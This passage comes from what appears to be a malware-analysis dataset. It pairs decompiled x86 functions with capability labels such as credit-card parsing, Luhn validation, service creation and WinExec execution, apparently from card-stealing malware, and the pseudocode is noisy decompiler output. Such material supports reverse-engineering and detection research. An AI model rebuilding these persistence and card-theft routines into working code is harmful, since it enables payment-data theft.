0xb;\n            iVar15 = in_SS;\n        }\n        puVar8 = CONCAT22(uVar27, iVar15);\n        in_SS = iVar15;\n        fcn.00403cb0(0x4202b0, 0x12, str._bPt_, 0x47);\n        fcn.00403cb0(0x4202b0, 0x12, 0x420324, 0xc);\n        uVar6 = unaff_EBX;\n        cVar19 = '\\0';\n        cVar18 = '\\0';\n        bVar16 = (((uVar6 ^ unaff_SI) >> 8) - 1U & 0xd) == 0;\n        uVar27 = 0x40;\n        fcn.00403cb0(0x4202b0, 0x12, str.8VYX, 8);\n        if ((bVar16 || cVar19 != cVar18) || (!bVar16 && cVar19 == cVar18)) break;\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    fcn.00403cb0(0x4202b0, 0x12, 0x420338, 0xd);\n    fcn.00403cb0(0x4202b0, 0x12, 0x420348, 0x18);\n    fcn.00403cb0(0x4202b0, 0x12, str._aTWU, 0x25);\n    fcn.00403cb0(0x4202b0, 0x12, str.2OJ_Z, 10);\n    uVar27 = 0x2b0;\n    uVar28 = 0x42;\n    fcn.00403cb0(0x4202b0, 0x12, 0x420394, 0xc);\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    fcn.00403cb0(0x4202b0, 0x12, str.9WoJ, CONCAT22(uVar28, uVar27));\n    fcn.00403cb0(0x4202b0, 0x12, str._ZFyG, 6);\n    bVar16 = (iVar15 + 0x2562U & 0xffffff00 | iVar15 + 0x2562U | 0x4c | extraout_ECX_00) < 0;\n    uVar27 = 0x2bb8;\n    uVar28 = 0x40;\n    iVar3 = fcn.00403cb0(0x4202b0, 0x12, \" TTm0\", 5);\n    if ((bVar16) || (!bVar16)) {\n        uVar27 = 0xd;\n        uVar28 = 0;\n    }\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    fcn.00403cb0(0x4202b0, 0x12, 0x4203c0, CONCAT22(uVar28, uVar27));\n    fcn.00403cb0(0x4202b0, 0x12, str.C_uX, 0x19);\n    fcn.00403cb0(0x4202b0, 0x12, str..UAa_, 0xf);\n    uVar2 = fcn.00403cb0(0x4202b0, 0x12, str._T__, 0xe);\n    cVar19 = '\\0';\n    cVar18 = (((uVar2 & 0xff | (uVar2 >> 8 & extraout_DX >> 8) << 8) * 2 | extraout_DX) ^ 0x6c00 ^ uVar6) < 0;\n    uVar4 = fcn.00403cb0(0x4202b0, 0x12, str.0JMdt, 0xd);\n    puVar13 = puVar8;\n    if ((cVar19 == cVar18) && (cVar19 != cVar18)) {\n        out(0xc4, uVar4);\n        puVar13 = puVar8 + 1;\n        *puVar8 = uVar4;\n    }\n    fcn.00403cb0(0x4202b0, 0x12, str._VHdu, 0xc);\n    uVar5 = fcn.00403cb0(0x4202b0, 0x12, str.9BZRH, 0xf);\n    bVar16 = ((uVar5 ^ 0x687c) & 0x3000) == 0;\n    fcn.00403cb0(0x4202b0, 0x12, 0x420438, 0xb);\n    puVar8 = puVar9;\n    if ((!bVar16) && (bVar16)) {\n        puStack48436 = &stack0xffff4310;\n        puVar26 = &stack0xffff4310;\n        puVar8 = &stack0xffff4310;\n        cVar18 = '\\x10';\n        do {\n            puVar9 = puVar9 + -1;\n            puVar26 = puVar26 + -1;\n            *puVar26 = *puVar9;\n            cVar18 = cVar18 + -1;\n        } while ('\\0' < cVar18);\n    }\n    fcn.00403cb0(0x4202b0, 0x12, str._MYWK, 0xb);\n    fcn.00403cb0(0x4202b0, 0x12, 0x420450, 0xb);\n    fcn.00403cb0(0x4202b0, 0x12, 0x42045c, 10);\n    if ((*0x10 == 0x11b3e) || (*0x10 != 0x11b3e)) {\n        puVar26 = 0xc;\n        puVar9 = puVar13;\n    }\n    else {\n        uVar4 = in(extraout_EDX_00);\n        *puVar13 = uVar4;\n        puVar9 = puVar13 + 1;\n        puVar26 = puVar13;\n        if (&stack0xfffee4c2 < 1) {\n            in(0xb);\n        }\n    }\n    *(extraout_EDX_00 + 0xc) = *(extraout_EDX_00 + 0xc) ^ extraout_CH;\n    fcn.00403cb0(0x4202b0, 0x12, str._nMChW, puVar26);\n    fcn.00403cb0(0x4202b0, 0x12, str.6H_fI, 0xe);\n    Var24 = SUB43(puVar8, 0);\n    uVar23 = iVar3 + -0x1bf31dd6 >> 0x18;\n    iVar22 = (iVar3 + -0x1bf31dd6) * 0x100;\n    uVar5 = CONCAT31(0x402dba, puVar8 >> 0x18);\n    fcn.00403cb0(0x4202b0, 0x12, str._WDyV, 0x11);\n    bVar16 = false;\n    uVar5 = uVar5 & 0xff;\n    fcn.00403cb0(0x4202b0, 0x12, str.UFT, 0x13);\n    if (!bVar16) {\n        uVar5 = uVar5 & 0xff | extraout_EDX_01 << 8;\n        uVar25 = extraout_EDX_01 >> 0x18;\n        if (bVar16) goto code_r0x00402dff;\n    }\n    uVar25 = 0;\n    uVar5 = 0x1400;\n    iVar22 = 0x1200;\n    Var24 = 0x4204ac;\n    uVar23 = 0;\ncode_r0x00402dff:\n    *(iVar3 + 0x27de5964) = *(iVar3 + 0x27de5964) ^ 0x6a27e95e;\n    *(extraout_EDX_01 + 0x12) = *(extraout_EDX_01 + 0x12) + extraout_CH_00;\n    uVar20 = fcn.00403cb0(0x4202b0, CONCAT13(uVar23, iVar22 >> 8), CONCAT13(uVar5, Var24), CONCAT13(uVar25, uVar5 >> 8))\n    ;\n    puVar7 = &stack0xfffee496 ^ *(unaff_EBX + 0x6a);\n    uVar5 = *(iVar3 + -0x1bf31e15);\n    pcVar1 = (uVar20 >> 0x20) + 0x12;\n    *pcVar1 = *pcVar1 + extraout_CH_01;\n    puVar7[-1] = 0x4202b0;\n    puVar7[-2] = 0x402e49;\n    uVar4 = fcn.00403cb0(puVar7[-1], *puVar7, puVar7[1], puVar7[2]);\n    puVar7[10] = uVar4;\n    *(puVar7 + 0x26) = uVar6;\n    uVar6 = *(puVar7 + 0x26);\n    puVar7[10] = 10;\n    puVar7[9] = str.7CXs;\n    puVar7[8] = 0x12;\n    puVar7[7] = 0x4202b0;\n    puVar7[6] = 0x402e77;\n    uVar4 = fcn.00403cb0(puVar7[7], puVar7[8], puVar7[9], puVar7[10]);\n    puVar7[10] = uVar4;\n    puVar7[9] = (unaff_EBX >> 8 & 0xffff00) << 8 | uVar6;\n    puVar7[8] = extraout_ECX_01;\n    uVar4 = puVar7[9];\n    puVar7[10] = 4;\n    puVar7[9] = \"&ea\\t\\'LBm0\";\n    puVar7[8] = 0x12;\n    puVar7[7] = 0x4202b0;\n    puVar7[6] = 0x402e96;\n    uVar21 = fcn.00403cb0(puVar7[7], puVar7[8], puVar7[9], puVar7[10]);\n    puVar7[10] = uVar21;\n    puVar7[9] = extraout_ECX_02;\n    puVar7[8] = uVar21 >> 0x20;\n    puVar7[7] = uVar4;\n    puVar7[6] = puVar7 + 0xb;\n    puVar7[5] = puVar8 ^ uVar5;\n    puVar7[4] = uVar20;\n    puVar7[3] = puVar9;\n    uVar14 = puVar7[3];\n    uVar11 = puVar7[4];\n    uVar10 = puVar7[5];\n    uVar4 = puVar7[7];\n    puVar7[10] = 5;\n    puVar7[9] = \"\\'LBm0\";\n    puVar7[8] = 0x12;\n    puVar7[7] = 0x4202b0;\n    puVar7[6] = 0x402eb4;\n    uVar20 = fcn.00403cb0(puVar7[7], puVar7[8], puVar7[9], puVar7[10]);\n    puVar7[10] = uVar20;\n    puVar7[9] = extraout_ECX_03;\n    puVar7[8] = uVar20 >> 0x20;\n    puVar7[7] = uVar4;\n    puVar7[6] = puVar7 + 0xb;\n    puVar7[5] = uVar10;\n    puVar7[4] = uVar11;\n    puVar7[3] = uVar14;\n    uVar12 = puVar7[4];\n    uVar4 = puVar7[7];\n    puVar7[10] = 6;\n    puVar7[9] = 0x42050c;\n    puVar7[8] = 0x12;\n    puVar7[7] = 0x4202b0;\n    puVar7[6] = 0x402ed2;\n    fcn.00403cb0(puVar7[7], puVar7[8], puVar7[9], puVar7[10]);\n    puVar7[10] = extraout_ECX_04;\n    puVar7[10] = 0xc;\n    puVar7[9] = 0x420514;\n    puVar7[8] = 0x12;\n    puVar7[7] = 0x4202b0;\n    puVar7[6] = 0x402ef5;\n    uVar5 = fcn.00403cb0(puVar7[7], puVar7[8], puVar7[9], puVar7[10]);\n    puVar7[10] = uVar5;\n    bVar16 = false;\n    bVar17 = (uVar12 & (uVar5 & 0xffff0000 | CONCAT11((uVar5 >> 8) + '\\x01', uVar5))) == 0;\n    puVar7[10] = 0xc;\n    puVar7[9] = str..ldM;\n    puVar7[8] = 0x12;\n    puVar7[7] = 0x4202b0;\n    puVar7[6] = 0x402f16;\n    fcn.00403cb0(puVar7[7], puVar7[8], puVar7[9], puVar7[10]);\n    puVar8 = puVar7 + 7;\n    if ((!bVar16 && !bVar17) && (puVar8 = puVar7 + 7,  bVar16 || bVar17)) {\n        puVar8 = puVar7 + 8;\n    }\n    puVar8[-1] = 0x2a;\n    puVar8[-2] = str._bmmSh;\n    puVar8[-3] = 0x12;\n    puVar8[-4] = 0x4202b0;\n    puVar8[-5] = 0x402f3a;\n    fcn.00403cb0(puVar8[-4], puVar8[-3], puVar8[-2], puVar8[-1]);\n    puVar8[3] = uVar4;\n    puVar8[2] = extraout_EDX_02;\n    puVar8[3] = 0xb;\n    puVar8[2] = str._WKtJ;\n    puVar8[1] = 0x12;\n    *puVar8 = 0x4202b0;\n    puVar8[-1] = 0x402f5b;\n    fcn.00403cb0(*puVar8, puVar8[1], puVar8[2], puVar8[3]);\n    puVar8[-1] = 0x41;\n    puVar8[-2] = 0x4205e0;\n    puVar8[-3] = 0x12;\n    puVar8[-4] = 0x4202b0;\n    puVar8[-5] = 0x402f6e;\n    fcn.00403cb0(puVar8[-4], puVar8[-3], puVar8[-2], puVar8[-1]);\n    puVar8[-5] = 0x33;\n    puVar8[-6] = 0x420624;\n    puVar8[-7] = 0x12;\n    puVar8[-8] = 0x4202b0;\n    puVar8[-9] = 0x402f81;\n    fcn.00403cb0(puVar8[-8], puVar8[-7], puVar8[-6], puVar8[-5]);\n    puVar8[-9] = 0x4b;\n    puVar8[-10] = 0x420658;\n    puVar8[-0xb] = 0x12;\n    puVar8[-0xc] = 0x4202b0;\n    puVar8[-0xd] = 0x402f94;\n    fcn.00403cb0(puVar8[-0xc], puVar8[-0xb], puVar8[-10], puVar8[-9]);\n    puVar8[3] = 0x39;\n    puVar8[2] = str._v_KH;\n    puVar8[1] = 0x12;\n    *puVar8 = 0x4202b0;\n    puVar8[-1] = 0x402faa;\n    fcn.00403cb0(*puVar8, puVar8[1], puVar8[2], puVar8[3]);\n    puVar8[-1] = 8;\n    puVar8[-2] = str.4u_SX;\n    puVar8[-3] = 0x12;\n    puVar8[-4] = 0x4202b0;\n    puVar8[-5] = 0x402fbd;\n    fcn.00403cb0(puVar8[-4], puVar8[-3], puVar8[-2], puVar8[-1]);\n    puVar8[-5] = 0x14;\n    puVar8[-6] = str._O_N;\n    puVar8[-7] = 0x12;\n    puVar8[-8] = 0x4202b0;\n    puVar8[-9] = 0x402fd0;\n    fcn.00403cb0(puVar8[-8], puVar8[-7], puVar8[-6], puVar8[-5]);\n    return;\n}\n",
        "token_count": 5198
    },
    "00402fe0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403142) overlaps instruction at (ram,0x0040313e)\n// \n\nvoid fcn.00402fe0(void)\n\n{\n    int32_t iVar1;\n    char extraout_CH;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    char extraout_DL;\n    int32_t unaff_EBX;\n    uint *unaff_EBP;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    char cVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    uint *puVar6;\n    uint in_stack_ffffffd8;\n    uint in_stack_ffffffdc;\n    uint uVar7;\n    ushort uVar8;\n    ushort uVar9;\n    ushort uVar10;\n    ushort uVar11;\n    ushort uVar12;\n    ushort uVar13;\n    \n    fcn.00403cb0(0x4202b0, 0x12, 0x4202cc, 0x11);\n    fcn.00403cb0(0x4202b0, 0x12, 0x42052c, 0x10);\n    fcn.00403cb0(0x4202b0, 0x12, 0x42053c, 0x1a);\n    bVar3 = SCARRY4(unaff_EBX, 1);\n    fcn.00403cb0(0x4202b0, 0x12, 0x420590, 10);\n    if ((bVar3) || (uVar7 = extraout_ECX,  !bVar3)) {\n        uVar7 = 0xb;\n        in_stack_ffffffdc = 0x42059c;\n        in_stack_ffffffd8 = 0x12;\n    }\n    *unaff_EDI = *unaff_ESI;\n    fcn.00403cb0(0x4202b0, in_stack_ffffffd8, in_stack_ffffffdc, uVar7);\n    iVar1 = fcn.00403cb0(0x4202b0, 0x12, 0x4205a8, 8);\n    bVar3 = SCARRY4(iVar1, 1);\n    fcn.00403cb0(0x4202b0, 0x12, 0x4205b0, 9);\n    if ((bVar3) || (uVar7 = extraout_ECX_00,  !bVar3)) {\n        uVar7 = 9;\n        in_stack_ffffffdc = 0x4205bc;\n        in_stack_ffffffd8 = 0x12;\n    }\n    unaff_EDI[1] = unaff_ESI[1];\n    fcn.00403cb0(0x4202b0, in_stack_ffffffd8, in_stack_ffffffdc, uVar7);\n    fcn.00403cb0(0x4202b0, 0x12, 0x4205c8, 9);\n    while( true ) {\n        fcn.00403cb0(0x4202b0, 0x12, 0x4205d4, 0xc);\n        fcn.00403cb0(0x4202b0, 0x12, 0x4206fc, 3);\n        fcn.00403cb0(0x4202b0, 0x12, str.Qw_L, 10);\n        cVar4 = SBORROW1(extraout_DL, 'Q');\n        cVar2 = extraout_DL + -0x51 < '\\0';\n        bVar3 = extraout_DL == 'Q';\n        fcn.00403cb0(0x4202b0, 0x12, 0x42070c, 0x1b);\n        if ((bVar3 || cVar4 != cVar2) || (!bVar3 && cVar4 == cVar2)) break;\n        if (extraout_ECX_01 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    fcn.00403cb0(0x4202b0, 0x12, 0x420728, 0x12);\n    fcn.00403cb0(0x4202b0, 0x12, 0x42073c, 0x40);\n    fcn.00403cb0(0x4202b0, 0x12, str.9MqU, 0xc);\n    fcn.00403cb0(0x4202b0, 0x12, 0x420788, 0xb);\n    fcn.00403cb0(0x4202b0, 0x12, 0x420794, 4);\n    fcn.00403cb0(0x4202b0, 0x12, 0x420798, 4);\n    fcn.00403cb0(0x4202b0, 0x12, 0x42079c, 0xc);\n    uVar12 = 4;\n    uVar13 = 0;\n    uVar10 = 0x7a8;\n    uVar11 = 0x42;\n    uVar8 = 0x12;\n    uVar9 = 0;\n    fcn.00403cb0(0x4202b0, 0x12, str.O__t, 4);\n    unaff_EDI[2] = unaff_ESI[2];\n    uVar5 = SCARRY1(*0xac68097d, extraout_CH);\n    *0xac68097d = *0xac68097d + extraout_CH;\n    bVar3 = *0xac68097d == '\\0';\n    fcn.00403cb0(0x4202b0, CONCAT22(uVar9, uVar8), CONCAT22(uVar11, uVar10), CONCAT22(uVar13, uVar12));\n    if ((!bVar3) && (bVar3)) {\n        puVar6 = &stack0xffffffe0;\n        cVar2 = '\\x10';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar6 = puVar6 + -1;\n            *puVar6 = *unaff_EBP;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n    }\n    puVar6 = 0x4202b0;\n    fcn.00403cb0(0x4202b0, 0x12, 0x4207b8, 0x16);\n    if ((!uVar5) && (uVar5)) {\n        *puVar6 = CONCAT22(uVar13, uVar12);\n        return;\n    }\n    fcn.00403cb0(0x4202b0, 0x12, 0x4207d0, 7);\n    return;\n}\n",
        "token_count": 1579
    },
    "00403d50": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403dee) overlaps instruction at (ram,0x00403dec)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00403d95)\n// WARNING: Removing unreachable block (ram,0x00403d9b)\n\nuchar * fcn.00403d50(uint *param_1)\n\n{\n    uchar *puVar1;\n    uint8_t extraout_CH;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint32_t unaff_EBX;\n    uchar *puVar3;\n    uint unaff_ESI;\n    uchar *puVar4;\n    uint unaff_EDI;\n    uint *puVar5;\n    uchar uVar6;\n    bool bVar7;\n    char cVar8;\n    char cVar9;\n    uchar *puVar10;\n    uint noname_2;\n    uint noname_3;\n    uint noname_4;\n    uint32_t noname_5;\n    uint in_stack_fffffded;\n    uint in_stack_fffffdf1;\n    uint in_stack_fffffdf5;\n    uint in_stack_fffffdf9;\n    uint in_stack_fffffdfd;\n    uint in_stack_fffffe01;\n    uint in_stack_fffffe05;\n    uint in_stack_fffffe09;\n    uint in_stack_fffffe0d;\n    uint in_stack_fffffe11;\n    uint in_stack_fffffe15;\n    uint in_stack_fffffe19;\n    uint in_stack_fffffe1d;\n    uint in_stack_fffffe21;\n    uint in_stack_fffffe25;\n    uint in_stack_fffffe29;\n    uint in_stack_fffffe2d;\n    uint in_stack_fffffe31;\n    uint in_stack_fffffe35;\n    uint in_stack_fffffe39;\n    uint in_stack_fffffe3d;\n    uint in_stack_fffffe41;\n    uint in_stack_fffffe45;\n    uint in_stack_fffffe49;\n    uint in_stack_fffffe4d;\n    uint in_stack_fffffe51;\n    uint in_stack_fffffe55;\n    uint in_stack_fffffe59;\n    uint in_stack_fffffe5d;\n    uint in_stack_fffffe61;\n    uchar uStack272;\n    uint uStack271;\n    uchar auStack8 [4];\n    \n    puVar3 = &stack0xfffffffc;\n    noname_5 = unaff_EBX >> 8;\n    noname_4 = CONCAT13(unaff_EBX, unaff_ESI >> 8);\n    noname_3 = CONCAT13(unaff_ESI, unaff_EDI >> 8);\n    puVar5 = &stack0xfffffded;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    uVar6 = 0;\n    uStack272 = 0;\n    puVar5 = &uStack271;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    cVar8 = '\\x01';\n    puVar4 = 0x1;\n    puVar10 = &stack0xfffffdec;\n    noname_2 = 0x104;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&uStack272, 0xec, 0xec);\n    if ((uVar6) || (!uVar6)) {\n        puVar1 = auStack8;\n    }\n    else {\n        if (extraout_ECX != 1 && cVar8 != '\\0') {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *param_1 = 5;\n        puVar4 = 0x8db8ec44;\n        puVar3 = &stack0xfffffffd;\n        puVar1 = *0x9750e2b5;\n    }\n    fcn.00401970(puVar3 + -8, puVar1);\n    iVar2 = fcn.00401eb0(param_1, *(puVar3 + 0xc), *(puVar3 + 0x10), *(puVar3 + 0x14), *(puVar3 + -8), *(puVar3 + -4));\n    if (iVar2 == 0) {\n        return NULL;\n    }\n    cVar9 = '\\0';\n    cVar8 = '\\0';\n    bVar7 = (CONCAT31(extraout_CH & 0xb, 0xc) & (param_1 & iVar2) + 0xaf70) == 0;\n    *0x420814 = fcn.004044f0();\n    if ((!bVar7 && cVar9 == cVar8) && (bVar7 || cVar9 != cVar8)) {\n        if (extraout_ECX_00 == 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar2 = fcn.00402170(puVar3 + -0x10c, *(puVar3 + -8), *(puVar3 + -4));\n    if (iVar2 == 0) {\n        return NULL;\n    }\n    fcn.004017b0();\n    iVar2 = fcn.00404a80(0x420324);\n    if (iVar2 == -1) {\n        iVar2 = fcn.00404a80(str._bPt_);\n        if (iVar2 == -1) goto code_r0x00403f28;\n        uVar6 = 0xf;\n    }\n    else {\n        uVar6 = 0xe;\n    }\n    iVar2 = fcn.004012c0(*(puVar3 + 8));\n    if (iVar2 != 0) {\n        fcn.00401390();\n        fcn.00403520(uVar6);\n        return 0x1;\n    }\ncode_r0x00403f28:\n    puVar1 = fcn.00404a00(*(puVar3 + 8), puVar3 + -0x10c);\n    if (puVar1 == NULL) {\n        puVar4 = NULL;\n    }\n    if ((puVar4 != NULL) &&\n       (puVar1 = fcn.00404c40(*(puVar3 + 8), puVar10, noname_2, noname_3, noname_4, noname_5, in_stack_fffffded, \n                              in_stack_fffffdf1, in_stack_fffffdf5, in_stack_fffffdf9, in_stack_fffffdfd, \n                              in_stack_fffffe01, in_stack_fffffe05, in_stack_fffffe09, in_stack_fffffe0d, \n                              in_stack_fffffe11, in_stack_fffffe15, in_stack_fffffe19, in_stack_fffffe1d, \n                              in_stack_fffffe21, in_stack_fffffe25, in_stack_fffffe29, in_stack_fffffe2d, \n                              in_stack_fffffe31, in_stack_fffffe35, in_stack_fffffe39, in_stack_fffffe3d, \n                              in_stack_fffffe41, in_stack_fffffe45, in_stack_fffffe49, in_stack_fffffe4d, \n                              in_stack_fffffe51, in_stack_fffffe55, in_stack_fffffe59, in_stack_fffffe5d, \n                              in_stack_fffffe61),  puVar1 == NULL)) {\n        puVar4 = NULL;\n    }\n    puVar10 = puVar4;\n    if (puVar4 == NULL) {\n        puVar1 = fcn.00401cb0(*(puVar3 + 8), 0);\n        puVar4 = puVar1;\n        puVar10 = &stack0xfffffdd9;\n    }\n    bVar7 = (POPCOUNT(puVar10 & 0xff) & 1U) != 0;\n    if (((bVar7) && (!bVar7)) || (bVar7 = false,  puVar10 = puVar4,  puVar4 != NULL)) {\n        *(puVar3 + 0x6a0a74f6) = *(puVar3 + 0x6a0a74f6) + -1;\n        puVar1 = fcn.00403520();\n        bVar7 = SCARRY4(&stack0xfffffdd5, 4);\n        puVar10 = &stack0xfffffdd9;\n    }\n    if ((bVar7 == puVar10 < 0) && (bVar7 != puVar10 < 0)) {\n        func_0xff403feb();\n        puVar4 = puVar1;\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(0x38, 0);\n    return puVar4;\n}\n",
        "token_count": 2110
    },
    "004037b0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint32_t fcn.004037b0(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    uint auStack24 [4];\n    uint uStack8;\n    uint uStack4;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(param_1);\n    pcVar1 = _sym.imp.SHLWAPI.dll_StrStrA;\n    auStack24[0] = 0x420590;\n    auStack24[1] = 0x42059c;\n    auStack24[2] = 0x4205a8;\n    auStack24[3] = 0x4205b0;\n    uStack8 = 0x4205bc;\n    uStack4 = 0x4205c8;\n    uVar3 = 0;\n    puVar4 = auStack24;\n    do {\n        iVar2 = (*pcVar1)(param_1, *puVar4);\n        if (iVar2 != 0) {\n            return uVar3;\n        }\n        uVar3 = uVar3 + 1;\n        puVar4 = puVar4 + 1;\n    } while (uVar3 < 6);\n    return 0xffffffff;\n}\n",
        "token_count": 287
    },
    "00404930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00404930(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00404b60;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x4202c8;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 219
    },
    "004010d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004010d0(uint param_1, uint16_t param_2)\n\n{\n    uchar in_AL;\n    uint uVar1;\n    uint32_t unaff_EBP;\n    uchar *unaff_ESI;\n    uint32_t unaff_EDI;\n    bool bVar2;\n    char in_SF;\n    char in_OF;\n    \n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        unaff_ESI = unaff_ESI + -1;\n        *(unaff_EDI | unaff_EBP) = in_AL;\n        param_2 = param_2 & 0xff00;\n    }\n    bVar2 = *0x4207e4 == 0;\n    if (bVar2) {\n        if ((!bVar2) && (bVar2)) {\n            out(*unaff_ESI, param_2);\n        }\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x4207e4 = 1;\n    }\n    return;\n}\n",
        "token_count": 247
    },
    "00401130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401130(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    ushort in_DX;\n    uchar *unaff_ESI;\n    uint32_t uVar2;\n    bool in_ZF;\n    \n    if ((!in_ZF) && (in_ZF)) {\n        out(*unaff_ESI, in_DX);\n    }\n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "00401970": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401970(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00401a00(&var_68h, &var_4h);\n    fcn.004015c0(&var_68h, var_4h, 0x406010, 0xa2a0);\n    *arg_8h = 0x406010;\n    *arg_ch = 0xa2a0;\n    return;\n}\n",
        "token_count": 241
    },
    "00401e30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401e30(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 139
    },
    "00402530": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040273f) overlaps instruction at (ram,0x0040273c)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x0040256d)\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl fcn.00402530(uchar *arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    ushort uVar5;\n    char *in_EAX;\n    uint uVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    uint16_t uVar9;\n    int16_t iVar10;\n    uint32_t in_ECX;\n    uint32_t uVar11;\n    uint16_t uVar12;\n    uint32_t in_EDX;\n    uint8_t uVar14;\n    char **unaff_EBX;\n    uint32_t uVar13;\n    uint *puVar15;\n    uint *puVar16;\n    int32_t iVar17;\n    uint uVar18;\n    char **unaff_EDI;\n    uchar *puVar19;\n    char **ppcVar20;\n    uint8_t *puVar21;\n    uint16_t in_ES;\n    uint16_t in_SS;\n    uint16_t in_DS;\n    uint8_t in_AF;\n    bool bVar22;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar23;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uchar auStack148 [96];\n    uint8_t *apuStack52 [3];\n    uchar auStack40 [4];\n    uint32_t uStack36;\n    uchar auStack28 [4];\n    uint uStack24;\n    uint32_t uStack20;\n    \n    uVar14 = unaff_EBX >> 8;\n    bVar23 = 